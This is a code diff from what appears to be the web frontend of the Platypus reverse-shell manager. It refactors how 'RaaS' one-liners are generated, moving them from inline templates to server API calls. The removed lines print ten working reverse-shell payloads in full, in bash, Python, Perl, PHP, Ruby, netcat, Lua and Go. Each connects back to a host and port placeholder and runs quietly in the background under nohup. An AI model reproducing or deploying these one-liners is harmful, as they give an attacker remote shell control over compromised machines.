@@ -166,32 +166,25 @@ export async function DeleteListener(hash: string): Promise<void> {
     await apiFetch("/api/server/" + encodeURIComponent(hash), { method: "DELETE" });
 }
 
-// ---------- RaaS oneliner (inline templates, no server call) ------------
-// Mirrors desktop/internal/app/listeners.go raasTemplates. Keep in sync.
-
-const raasTemplates: Record<string, string> = {
-    bash: `/usr/bin/nohup /bin/bash -c '/bin/bash -i >/dev/tcp/__HOST__/__PORT__ 0>&1 &' >/dev/null`,
-    python: `/usr/bin/nohup /bin/bash -c 'python -c '\\''import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("__HOST__",__PORT__));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);import os; os.system("/bin/bash")'\\'' &' >/dev/null`,
-    python2: `/usr/bin/nohup /bin/bash -c 'python2 -c '\\''import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("__HOST__",__PORT__));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);import os; os.system("/bin/bash")'\\'' &' >/dev/null`,
-    python3: `/usr/bin/nohup /bin/bash -c 'python3 -c '\\''import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("__HOST__",__PORT__));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);import os; os.system("/bin/bash")'\\'' &' >/dev/null`,
-    perl: `/usr/bin/nohup /bin/bash -c 'perl -e '\\''use Socket;$i="__HOST__";$p=__PORT__;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");system("/bin/bash -i");};'\\'' &' >/dev/null`,
-    php: `/usr/bin/nohup /bin/bash -c 'php -r '\\''$sock=fsockopen("__HOST__",__PORT__);shell_exec("/bin/bash -i <&3 >&3");'\\'' &' >/dev/null`,
-    ruby: `/usr/bin/nohup /bin/bash -c "ruby -rsocket -e 'exec(\\"/bin/bash\\",\\"-c\\",\\"/bin/bash -i >/dev/tcp/__HOST__/__PORT__ 0>&1\\");' &" >/dev/null`,
-    nc: `/usr/bin/nohup /bin/bash -c "mkfifo /tmp/.platypus;nc __HOST__ __PORT__ 0</tmp/.platypus | /bin/bash | tee /tmp/.platypus &" >/dev/null`,
-    lua: `/usr/bin/nohup /bin/bash -c 'lua -e "require('\\''socket'\\'').connect('\\''__HOST__'\\'','\\''__PORT__'\\'');require('\\''os'\\'').execute('\\''/bin/bash -i <&3 >&3'\\'');" &' >/dev/null`,
-    go: `/usr/bin/nohup /bin/bash -c "echo 'package main;import\\"os/exec\\";import\\"net\\";func main(){c,_:=net.Dial(\\"tcp\\",\\"__HOST__:__PORT__\\");cmd:=exec.Command(\\"/bin/sh\\");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > /tmp/platypus.go && go run /tmp/platypus.go && rm /tmp/platypus.go &" >/dev/null`,
-};
+// ---------- RaaS (server is the single source of truth) ----------------
+// Both calls hit /api/v1/raas/* — the 10 templates live at
+// internal/utils/raas/templates/*.tpl on the server side and nowhere else.
 
 export async function AvailableRaasLanguages(): Promise<string[]> {
-    return Object.keys(raasTemplates).sort();
+    const resp = await apiJSON<{ languages?: string[] }>("/api/v1/raas/languages");
+    return (resp.languages || []).slice().sort();
 }
 
-export async function GenerateRaasOneliner(listenerHostPort: string, lang: string): Promise<string> {
-    const tpl = raasTemplates[lang] ?? raasTemplates["bash"];
+export async function GenerateRaasOneliner(
+    listenerHostPort: string,
+    lang: string,
+): Promise<string> {
     const i = listenerHostPort.lastIndexOf(":");
     const host = i >= 0 ? listenerHostPort.slice(0, i) : listenerHostPort;
     const port = i >= 0 ? listenerHostPort.slice(i + 1) : "13337";
-    return tpl.split("__HOST__").join(host).split("__PORT__").join(port);
+    const q = new URLSearchParams({ host, port, lang });
+    const resp = await apiJSON<{ oneliner?: string }>(`/api/v1/raas/oneliner?${q}`);
+    return resp.oneliner || "";
 }
 
 // ---------- Upgrade -----------------------------------------------------
